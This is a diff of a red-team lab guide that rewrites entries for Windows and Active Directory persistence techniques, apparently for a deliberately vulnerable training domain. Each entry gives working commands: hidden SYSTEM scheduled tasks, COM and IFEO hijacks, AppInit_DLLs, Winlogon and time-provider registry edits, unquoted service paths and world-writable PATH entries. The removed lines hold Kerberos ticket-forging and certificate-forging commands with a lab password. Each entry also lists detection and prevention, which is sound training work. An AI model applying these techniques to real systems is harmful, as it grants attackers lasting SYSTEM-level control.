@@ -42,30 +42,44 @@ reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 
 ---
 
-### PER-003 — Sticky Keys / Utilman Hijack
-**What it is:** replace `sethc.exe`/`utilman.exe` with `cmd.exe` → from the lock screen, press shift 5× / Win+U → SYSTEM cmd.
-**Tools:** `takeown`/`icacls`/`copy`.
+### PER-003 — Startup Folder
+**What it is:** Attacker drops a malicious executable or script (e.g., a batch file or `.lnk` shortcut) into the Startup folder of a specific user or the global "All Users" startup directory (`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\`). When a user logs in, Windows automatically executes the contents of this folder.
+**Tools:** Command line, PowerShell.
 **Steps:**
 ```cmd
-takeown /f C:\Windows\System32\sethc.exe
-icacls C:\Windows\System32\sethc.exe /grant Administrators:F
-copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+echo @echo off > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\updater.bat"
+echo echo PER-003-startup-persistence ^> C:\Flags\FLAG-PER-003-Startup.txt >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\updater.bat"
 ```
-**Detection:** file-integrity-monitoring on `sethc.exe`/`utilman.exe`; Sysmon `11`.
-**Prevention:** FIM; Credential Guard; lock-screen restriction GPO.
+**Detection:** Sysmon Event ID `11` (FileCreate) targeting the StartUp directories; Autoruns scan detecting new items in startup.
+**Prevention:** Enforce strict ACLs on `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` to prevent non-admins from writing to it; application control/AppLocker to restrict execution from startup directories.
 
 ---
 
-### PER-004 — Service Install
-**What it is:** `sc create` your service for boot-time SYSTEM exec.
-**Detection / Prevention:** PE-008.
+### PER-004 — Scheduled Task
+**What it is:** Creating a scheduled task that executes a payload under the `SYSTEM` context (or as another user). In the lab, a task named `SynchTask` is registered to run at logon and daily at 03:00.
+**Tools:** `schtasks.exe`, PowerShell.
+**Steps:**
+```powershell
+$action  = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo PER-004-persistence > C:\Flags\FLAG-PER-004-Schtask.txt'
+$trigger = @((New-ScheduledTaskTrigger -AtLogOn), (New-ScheduledTaskTrigger -Daily -At '03:00'))
+$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+$settings  = New-ScheduledTaskSettingsSet -Hidden
+Register-ScheduledTask -TaskName 'SynchTask' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'PER-004: Attacker scheduled task' -Force
+```
+**Detection:** Event ID `4698` (A scheduled task was created); Sysmon Event ID `1` (Process Creation) for `schtasks.exe` or executing tasks.
+**Prevention:** Restrict task creation permissions; baseline scheduled tasks; limit local admin permissions.
 
 ---
 
-### PER-005 — Scheduled Task
-**What it is:** `schtasks /create /sc onstart /ru SYSTEM` → SYSTEM at boot.
-**Detection:** Event `4698`.
-**Prevention:** monitor task creation; require admin to create tasks running as SYSTEM.
+### PER-005 — COM Hijacking
+**What it is:** Hijacking COM object loading. When a program requests a CLSID, Windows looks in `HKCU\Software\Classes\CLSID` before `HKLM\SOFTWARE\Classes\CLSID`. By putting a malicious DLL path under the target user's registry hive (or HKLM for system-wide hijack) for a CLSID like `{BCDE0395-E52F-467C-8E3D-C4579291692E}` (MMDeviceEnumerator), any app loading this COM object will execute the attacker's DLL.
+**Tools:** `reg add`, ProcMon.
+**Steps:**
+```cmd
+reg add "HKLM\SOFTWARE\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InProcServer32" /ve /t REG_SZ /d "C:\Tools\dvad_com.dll" /f
+```
+**Detection:** Sysmon Event ID `12` or `13` registry modifications in CLSID keys; loading of unsigned DLLs by common processes (Sysmon Event ID `7`).
+**Prevention:** Restrict write permissions to COM registry paths; audit CLSID configuration changes.
 
 ---
 
@@ -166,8 +180,17 @@ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=empire,DC=loc
 
 ---
 
-### PER-017 — DCShadow Persistent
-See CRED-015.
+### PER-017 — Service Binary
+**What it is:** Planting a malicious service binary or exploiting an unquoted service path. When a service executes, it runs under `SYSTEM` privileges. If the service binary path contains spaces and is unquoted (e.g., `C:\Program Files\DVAD Service\dvad_svc.exe`), Windows will attempt to execute `C:\Program.exe` or `C:\Program Files\DVAD.exe` before the actual path.
+**Tools:** `sc.exe`, `icacls`, `PowerUp.ps1`.
+**Steps:**
+```cmd
+# Create service with unquoted path:
+sc.exe create dvad_svc binPath= "C:\Program Files\DVAD Service\dvad_svc.exe" start= auto type= own
+sc.exe description dvad_svc "PER-017: Persistence service — unquoted path in C:\Program Files"
+```
+**Detection:** Event ID `7045` (A new service was installed); monitoring registry writes under `HKLM\SYSTEM\CurrentControlSet\Services\`; Sysmon Event ID `11` for file creations in restricted folders.
+**Prevention:** Ensure all service paths are enclosed in quotes; restrict write permissions to root directories and Program Files.
 
 ---
 
@@ -187,56 +210,71 @@ impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain empire.lo
 
 ---
 
-### PER-019 — Silver Ticket
-**What it is:** forge a TGS for a single service using that service account's NT hash. No DC interaction = no DC log.
-**Tools:** `mimikatz`, `ticketer.py`.
-**Steps:**
-```bash
-impacket-ticketer -nthash HASH -domain empire.local -spn cifs/scarif.empire.local -domain-sid S-1-5-21-... Administrator
-```
-**Detection:** Event `4624` Logon Type 3 to service with mismatched PAC; service-side ticket inspection.
-**Prevention:** AES-only; service-account password rotation; PAC validation.
-
----
-
-### PER-020 — Skeleton Key
-**What it is:** mimikatz `misc::skeleton` patches LSASS on DC → every account accepts a universal password (`mimikatz`) in addition to its real one.
-**Detection:** mimikatz signature; LSASS integrity check; reboot kills it.
-**Prevention:** Credential Guard; LSA Protection; reboot DCs regularly.
-
----
-
-### PER-021 — Diamond Ticket
-**What it is:** request a real TGT, decrypt with krbtgt hash, modify PAC (add group SIDs), re-encrypt. Looks legitimate because the 4768 *did* happen.
-**Tools:** `Rubeus diamond`, `ticketer.py -extra-pac`.
+### PER-019 — DLL Search Order
+**What it is:** Windows searches for DLLs in a specific order: the application's directory, the system directories, and the directories in the system `PATH` environment variable. By placing a world-writable directory (like `C:\Tools`) at the head of the system `PATH`, any process that attempts to load a DLL that isn't present in prior search locations will load the malicious DLL from `C:\Tools` instead.
+**Tools:** `icacls`, `Set-ItemProperty`.
 **Steps:**
 ```powershell
-.\Rubeus.exe diamond /tgtdeleg /krbkey:HASH /enctype:aes256 /ticketuser:Administrator /ticketuserid:500 /groups:512
+# Prepend C:\Tools to system PATH
+$oldPath = [Environment]::GetEnvironmentVariable('Path', 'Machine')
+[Environment]::SetEnvironmentVariable('Path', "C:\Tools;$oldPath", 'Machine')
+# Set world-writable permission on C:\Tools
+icacls "C:\Tools" /grant "Everyone:(OI)(CI)(F)"
 ```
-**Detection:** harder than Golden because 4768 exists; abnormal PAC SIDs vs requesting user.
-**Prevention:** PAC validation; krbtgt rotation.
+**Detection:** Sysmon Event ID `7` (Image loaded) where a common system process loads a DLL from an unusual path (e.g., `C:\Tools\`).
+**Prevention:** Do not add user-writable folders to the system `PATH` environment variable; keep `SafeDllSearchMode` enabled.
 
 ---
 
-### PER-022 — Sapphire Ticket
-**What it is:** stealthiest variant — fetch real PAC via S4U2Self+U2U, inject into a forged TGT. Indistinguishable PAC.
-**Tools:** `Rubeus diamond /sapphire`, `ticketer.py -impersonate`.
-**Detection:** very hard — looks legitimate.
-**Prevention:** krbtgt rotation; Protected Users.
-
----
-
-### PER-023 — Golden Certificate
-**What it is:** if you have DA/SYSTEM on the CA, export the CA cert + private key. Use it to mint client-auth certs for any user, forever. Survives krbtgt rotation, password resets, and most cleanup.
-**Tools:** `Certipy ca -backup`, `ForgeCert.exe`.
+### PER-020 — IFEO Debugger
+**What it is:** Image File Execution Options (IFEO) let developers debug applications by specifying a debugger to run when the target executable is launched. By creating a `Debugger` registry value for a binary like `sethc.exe` or `utilman.exe` pointing to `cmd.exe`, an attacker can launch `cmd.exe` as `SYSTEM` from the Windows login screen by pressing Shift five times (Sticky Keys) or pressing Windows Key + U (Utilman).
+**Tools:** `reg add`.
 **Steps:**
-```bash
-certipy ca -u Administrator -p 'EmpireLab2024!' -ca corp-CA-CA -backup
-ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword '' --Subject 'CN=Administrator' --SubjectAltName 'Administrator@empire.local' --NewCertPath admin.pfx --NewCertPassword ''
-certipy auth -pfx admin.pfx -dc-ip 10.10.0.10
+```cmd
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
 ```
-**Detection:** unusual `certutil -backupkey`/CA backup; private key export events (Event `70` on CA).
-**Prevention:** CA private key in HSM; tier-0 isolate CA; audit `4886`/`4887` for impersonation.
+**Detection:** Sysmon Event ID `13` (Registry value set) targeting the `Image File Execution Options` registry key; Event ID `4688` (Process Creation) where `cmd.exe` has `sethc.exe` or `utilman.exe` as parent.
+**Prevention:** Restrict write permissions to the HKLM IFEO registry path; disable accessibility tools on the lock screen.
+
+---
+
+### PER-021 — AppInit_DLLs
+**What it is:** The `AppInit_DLLs` registry key allows custom DLLs to be loaded into the address space of every interactive process that links with `user32.dll` at startup. This provides system-wide DLL injection.
+**Tools:** `reg add`.
+**Steps:**
+```cmd
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Tools\dvad_appinit.dll" /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
+```
+**Detection:** Monitoring registry value changes in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`; Sysmon Event ID `7` (Image loaded) showing unexpected DLLs loaded into processes.
+**Prevention:** Enable Secure Boot (which disables AppInit DLLs); set `LoadAppInit_DLLs` to `0` and restrict registry write permissions.
+
+---
+
+### PER-022 — Winlogon Helper
+**What it is:** The Windows logon process (`winlogon.exe`) reads registry values like `Userinit` and `Shell` to start the user environment. Attackers can append their malicious executable (e.g., `dvad_winlogon.exe`) to the comma-separated `Userinit` string, so that it runs every time a user logs in.
+**Tools:** `reg add`.
+**Steps:**
+```cmd
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\dvad_winlogon.exe" /f
+```
+**Detection:** Sysmon Event ID `13` targeting the `Winlogon` registry key; Event ID `4688` for processes launched by `winlogon.exe`.
+**Prevention:** Monitor and enforce integrity of the `Userinit` and `Shell` registry values; restrict write access to the Winlogon registry key.
+
+---
+
+### PER-023 — Time Provider
+**What it is:** The Windows Time service (`W32Time`) uses time providers to synchronize time. These are registered in the registry, and their DLLs are loaded into the service process (`svchost.exe` running as `SYSTEM`) at service start. By adding a custom time provider pointing to a malicious DLL, the attacker gains system-level persistence.
+**Tools:** `reg add`.
+**Steps:**
+```cmd
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\dvad_time" /v DllName /t REG_SZ /d "C:\Tools\dvad_time.dll" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\dvad_time" /v Enabled /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\dvad_time" /v InputProvider /t REG_DWORD /d 1 /f
+```
+**Detection:** Sysmon Event ID `13` targeting `W32Time\TimeProviders`; `W32Time` service starting and loading an unsigned or untrusted DLL.
+**Prevention:** Restrict write access to `HKLM\SYSTEM\CurrentControlSet\Services\W32Time\`; monitor loaded modules in `svchost.exe`.
 
 ---
 
@@ -295,10 +333,16 @@ certipy shadow auto -u peter.parker -p 'EmpireLab2024!' -account peter.parker
 
 ---
 
-### PER-031 — Schema Modification Backdoor
-**What it is:** Schema Admins → add malicious attribute / class that triggers privilege side-effects. Extremely persistent; survives most cleanup.
-**Detection:** schema container `5137`/`5141` events.
-**Prevention:** empty Schema Admins; only populate during planned schema changes.
+### PER-031 — GPO Boot Script
+**What it is:** Group Policy Objects (GPOs) allow administrators to configure startup/shutdown scripts that run on computers. An attacker can hijack GPO settings or directly inject a script into the registry or SYSVOL path of a linked GPO, running code as `SYSTEM` on all targeted systems at boot time.
+**Tools:** `reg add`, ActiveDirectory module.
+**Steps:**
+```cmd
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0" /v Script /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0" /v Parameters /t REG_SZ /d "/c echo GPO-Script-Running > C:\Flags\FLAG-PER-031-GPO.txt" /f
+```
+**Detection:** Event ID `5136` (A directory service object was modified) on GPO objects; Sysmon Event ID `11` for writes to `SYSVOL` policy scripts; Event ID `4688` for process launches by `gpscript.exe`.
+**Prevention:** Strictly restrict delegation permissions on GPOs (e.g., GPO Creator Owners); monitor modifications to policy templates in SYSVOL.
 
 ---
 
